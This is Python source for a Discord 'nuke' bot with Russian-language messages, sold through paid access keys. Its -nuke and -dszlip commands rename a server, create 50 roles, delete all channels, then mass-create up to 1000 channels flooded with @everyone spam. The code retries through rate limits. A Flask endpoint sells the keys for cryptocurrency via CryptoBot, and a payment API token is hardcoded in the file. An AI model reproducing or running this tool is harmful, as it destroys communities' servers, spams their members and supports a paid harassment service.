import discord
from discord.ext import commands
import asyncio
import time
import os
import json
import aiohttp
from datetime import datetime
from flask import Flask, request, jsonify
import threading
import requests

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

channel_counter = 0
start_time = 0
rate_limit_hits = 0
webhook_spam_active = False

OWNER_ID = 1448196738308509739  # ТВОЙ ID

keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_valid_key(user_id):
    user_id = str(user_id)
    if user_id in keys_data and keys_data[user_id] == "activated":
        return True
    return False

# === ЛОГИ В КАНАЛ ===
log_channel_id = None

async def log_to_channel(message, color=0x2f3136):
    if log_channel_id:
        channel = bot.get_channel(log_channel_id)
        if channel:
            embed = discord.Embed(
                description=f"📋 {message}",
                color=color,
                timestamp=datetime.now()
            )
            embed.set_footer(text=f"{datetime.now().strftime('%H:%M:%S')}")
            await channel.send(embed=embed)

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')
    print(f'🌐 Запущен на {len(bot.guilds)} серверах')
    print(f'👑 Владелец: {1448196738308509739}')
    
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Game(name="-dszlip")
    )

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"❌ Ошибка: {error}")

# === КОМАНДЫ ДЛЯ ВЛАДЕЛЬЦА ===
@bot.command()
async def admin(ctx):
    if not is_owner(ctx):
        return
    
    embed = discord.Embed(
        title="👑 АДМИН ПАНЕЛЬ",
        description="Управление ботом",
        color=discord.Color.dark_grey()
    )
    embed.add_field(name="-genkey @user/ID", value="Выдать ключ", inline=False)
    embed.add_field(name="-keys", value="Список ключей", inline=False)
    embed.add_field(name="-delkey @user/ID", value="Удалить ключ", inline=False)
    embed.add_field(name="-servers", value="Список серверов", inline=False)
    embed.add_field(name="-send ID текст", value="Отправить сообщение на сервер", inline=False)
    embed.add_field(name="-nuke ID", value="Нюкнуть сервер по ID", inline=False)
    embed.add_field(name="-log #канал", value="Настроить канал для логов", inline=False)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def log(ctx, channel: discord.TextChannel = None):
    if not is_owner(ctx):
        return
    
    global log_channel_id
    if channel:
        log_channel_id = channel.id
        await ctx.send(f"✅ Логи настроены на {channel.mention}")
    else:
        log_channel_id = None
        await ctx.send("❌ Логи отключены")

@bot.command()
async def genkey(ctx, arg = None):
    if not is_owner(ctx):
        return
    
    if not arg:
        await ctx.send("❌ Укажи пользователя: `-genkey @user` или `-genkey 123456789`")
        return
    
    user_id = None
    user_name = "Неизвестный"
    
    try:
        if arg.startswith('<@') and arg.endswith('>'):
            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
        else:
            user_id = int(arg)
    except:
        await ctx.send("❌ Неверный формат")
        return
    
    user_id = str(user_id)
    
    try:
        user = await bot.fetch_user(int(user_id))
        user_name = user.name
    except:
        user_name = f"Пользователь {user_id}"
    
    keys_data[user_id] = "activated"
    save_keys(keys_data)
    
    embed = discord.Embed(
        title="✅ КЛЮЧ ВЫДАН",
        description=f"Пользователь **{user_name}** получил доступ",
        color=0x00ff88
    )
    embed.add_field(name="ID", value=f"`{user_id}`", inline=False)
    await ctx.send(embed=embed)
    await log_to_channel(f"🔑 Ключ выдан: **{user_name}** (`{user_id}`)")
    
    try:
        user = await bot.fetch_user(int(user_id))
        embed_dm = discord.Embed(
            title="🔥 ДОСТУП АКТИВИРОВАН",
            description="Ты получил доступ к боту!\nИспользуй `-dszlip` для нюка",
            color=0xff4400
        )
        await user.send(embed=embed_dm)
    except:
        pass

@bot.command()
async def delkey(ctx, arg = None):
    if not is_owner(ctx):
        return
    
    if not arg:
        await ctx.send("❌ Укажи пользователя: `-delkey @user` или `-delkey 123456789`")
        return
    
    user_id = None
    
    try:
        if arg.startswith('<@') and arg.endswith('>'):
            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
        else:
            user_id = int(arg)
    except:
        await ctx.send("❌ Неверный формат")
        return
    
    user_id = str(user_id)
    
    try:
        user = await bot.fetch_user(int(user_id))
        user_name = user.name
    except:
        user_name = f"Пользователь {user_id}"
    
    if user_id in keys_data:
        del keys_data[user_id]
        save_keys(keys_data)
        await ctx.send(f"✅ Ключ у **{user_name}** удален")
        await log_to_channel(f"🗑️ Ключ удален у: **{user_name}** (`{user_id}`)")
    else:
        await ctx.send(f"❌ У **{user_name}** нет ключа")

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        return
    
    if not keys_data:
        await ctx.send("📭 Нет активированных ключей")
        return
    
    users = ""
    for uid, status in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            users += f"- {user.name} (ID: `{uid}`) - {status}\n"
        except:
            users += f"- `{uid}` - {status}\n"
    
    embed = discord.Embed(
        title="🔑 АКТИВНЫЕ КЛЮЧИ",
        description=users,
        color=0x2f3136
    )
    embed.set_footer(text=f"Всего: {len(keys_data)}")
    await ctx.send(embed=embed)

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        return
    
    server_list = ""
    for i, guild in enumerate(bot.guilds):
        server_list += f"{i+1}. {guild.name} (ID: `{guild.id}`) - {len(guild.members)} участников\n"
    
    if len(server_list) > 1900:
        with open("servers.txt", "w", encoding="utf-8") as f:
            f.write(server_list)
        await ctx.send(file=discord.File("servers.txt"))
        os.remove("servers.txt")
    else:
        await ctx.send(f"📊 Серверы бота:\n```{server_list}```")

@bot.command()
async def send(ctx, guild_id: int = None, *, message = None):
    if not is_owner(ctx):
        return
    
    if not guild_id:
        await ctx.send("❌ Укажи ID сервера: `-send 123456789 текст`")
        return
    
    if not message:
        await ctx.send("❌ Укажи сообщение: `-send 123456789 текст`")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
        return
    
    try:
        channel = guild.system_channel or guild.text_channels[0]
        await channel.send(f"📢 **ОТ ВЛАДЕЛЬЦА**\n{message}")
        await ctx.send(f"✅ Отправлено на сервер **{guild.name}**")
        await log_to_channel(f"📤 Рассылка на **{guild.name}** (`{guild_id}`)")
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")

@bot.command()
async def nuke(ctx, guild_id: int = None):
    if not is_owner(ctx):
        return
    
    if not guild_id:
        await ctx.send("❌ Укажи ID сервера: `-nuke 123456789`")
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"❌ Сервер с ID `{guild_id}` не найден")
        return
    
    await ctx.send(f"🔥 НЮК СЕРВЕРА: **{guild.name}**")
    await log_to_channel(f"💀 НЮК ЗАПУЩЕН: **{guild.name}** (`{guild_id}`)")
    
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    async def create_roles():
        for i in range(50):
            try:
                await guild.create_role(name=f"ZLIP-{i+1}")
            except:
                break
            await asyncio.sleep(0.01)
    
    await guild.edit(name="MOGGED BY ZLIP")
    await create_roles()
    print(f"✅ {guild.name} - Название и роли изменены")
    
    print(f"🗑️ {guild.name} - УДАЛЕНИЕ КАНАЛОВ...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        tasks = [delete_single_channel(ch) for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            else:
                skipped += 1
        
        if (i + batch_size) % 400 == 0:
            print(f"   📦 {guild.name} - Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 {guild.name} - Каналы: удалено {deleted}, пропущено {skipped}")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**

https://guns.lol/dszlip

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
"""
    
    created = 0
    failed = 0
    target_channels = 1000
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.001, 0.005)
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                return False
        except Exception as e:
            return False
    
    batch_size = 100
    max_batches = target_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        tasks = []
        for j in range(batch_size):
            i = batch_num * batch_size + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            break
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
        
        if created >= target_channels:
            print(f"✅ {guild.name} - Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print(f"💀 НЬЮК ЗАВЕРШЁН: {guild.name}")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print("="*50)
    
    await log_to_channel(f"✅ НЮК ЗАВЕРШЁН: **{guild.name}**\nСоздано: {created} каналов\nСообщений: {created * 5}")
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\n**{guild.name}**\nСоздано: {created} каналов\nСообщений: {created * 5}")
    except:
        pass

# === КОМАНДА ДЛЯ ПОЛЬЗОВАТЕЛЕЙ ===
@bot.command()
async def dszlip(ctx):
    if not has_valid_key(str(ctx.author.id)) and not is_owner(ctx):
        embed = discord.Embed(
            title="❌ НЕТ ДОСТУПА",
            description="У тебя нет ключа для использования бота",
            color=0xff0000
        )
        embed.add_field(name="💰 Купить ключ", value="Сайт: https://твой-ник.github.io/zlip-site/", inline=False)
        await ctx.send(embed=embed)
        return
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    await ctx.send("**ZLIP EBET**")
    
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    guild = ctx.guild
    
    async def create_roles():
        for i in range(50):
            try:
                await guild.create_role(name=f"ZLIP-{i+1}")
            except:
                break
            await asyncio.sleep(0.01)
    
    await guild.edit(name="MOGGED BY ZLIP")
    await create_roles()
    print("✅ Название и роли изменены")
    
    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        tasks = [delete_single_channel(ch) for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            else:
                skipped += 1
        
        if (i + batch_size) % 400 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**

https://guns.lol/dszlip

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
"""
    
    created = 0
    failed = 0
    target_channels = 1000
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.001, 0.005)
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                return False
        except Exception as e:
            return False
    
    batch_size = 100
    max_batches = target_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        tasks = []
        for j in range(batch_size):
            i = batch_num * batch_size + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            break
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
        
        if created >= target_channels:
            print(f"✅ Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print("="*50)
    
    await log_to_channel(f"💀 НЮК: **{guild.name}**\nСоздано: {created} каналов\nСообщений: {created * 5}")

# ===== CRYPTOBOT ОПЛАТА =====
app = Flask(__name__)

CRYPTOBOT_TOKEN = "611254:AAQSdtWQjDsgoHxuX4r6Wc9DaACJNSslWz6"  # ВСТАВЬ СВОЙ ТОКЕН
CRYPTOBOT_URL = "https://api.cryptobot.app/v1"

@app.route('/api/create-invoice', methods=['POST'])
def create_invoice():
    data = request.json
    user_id = data.get('user_id')
    plan = data.get('plan')
    
    if not user_id:
        return jsonify({'error': 'no user_id'}), 400
    
    amount = 2 if plan == 'month' else 5
    
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {CRYPTOBOT_TOKEN}'
    }
    
    payload = {
        'amount': amount,
        'currency': 'USDT',
        'description': f'ZLIP NUKE - {plan} для {user_id}',
        'payload': user_id
    }
    
    response = requests.post(f'{CRYPTOBOT_URL}/create-invoice', json=payload, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        return jsonify({
            'success': True,
            'pay_url': data.get('result', {}).get('pay_url'),
            'invoice_id': data.get('result', {}).get('invoice_id')
        })
    else:
        return jsonify({'success': False, 'error': 'CryptoBot error'}), 400

@app.route('/api/cryptobot-webhook', methods=['POST'])
def cryptobot_webhook():
    data = request.json
    status = data.get('status')
    user_id = data.get('payload')
    
    if status == 'paid' and user_id:
        keys_data[str(user_id)] = "activated"
        save_keys(keys_data)
        print(f'✅ Ключ выдан пользователю {user_id} (оплачено через CryptoBot)')
        
        # Отправляем уведомление владельцу в ЛС
        try:
            async def notify_owner():
                user = await bot.fetch_user(OWNER_ID)
                await user.send(f"✅ **ОПЛАТА ПОЛУЧЕНА!**\nПользователь `{user_id}` купил ключ\nТариф: {data.get('description', 'неизвестно')}")
            asyncio.run_coroutine_threadsafe(notify_owner(), bot.loop)
        except:
            pass
        
        return jsonify({'ok': True})
    
    return jsonify({'ok': False}), 400

def run_web():
    app.run(host='0.0.0.0', port=5000)

threading.Thread(target=run_web, daemon=True).start()

# =================================

import os
bot.run(os.environ['TOKEN'])
